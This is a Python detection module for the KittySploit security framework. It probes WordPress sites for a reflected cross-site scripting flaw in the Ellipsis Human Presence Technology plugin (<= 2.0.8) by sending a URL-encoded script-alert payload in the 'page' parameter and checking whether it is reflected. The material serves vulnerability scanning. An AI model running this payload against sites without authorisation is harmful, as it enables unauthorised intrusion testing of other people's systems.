#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""The 'page' GET parameter of the inc/protected-forms-table."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Ellipsis Human Presence Technology <= 2.0.8 - Cross Site Scripting Detection',
        'description': "The 'page' GET parameter of the inc/protected-forms-table.php file was affected by a reflected XSS vulnerability.",
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'wpscan', 'packetstorm', 'wordpress', 'wp-plugin', 'ellipsis-human-presence-technology', 'xss', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://wpscan.com/vulnerability/c0a138d8-93ac-463c-b650-d849352c0b44',
            'https://packetstormsecurity.com/files/154393/',
            'https://wordpress.org/plugins/ellipsis-human-presence-technology/',
        ],
    }

    def run(self):
        path = '/wp-content/plugins/ellipsis-human-presence-technology/inc/protected-forms-table.php?&page=%22%20%3E%3Cscript%3Ealert(document.location)%3C/script%3E'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_all = ('<script>alert(document.location)</script>', '<form id="protected-forms-table"',)
        header_any = ('text/html',)
        if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
            self.set_info(severity='medium', reason='Ellipsis Human Presence Technology <= 2.0.8 - Cross Site Scripting detected', path=path)
            return True
        return False

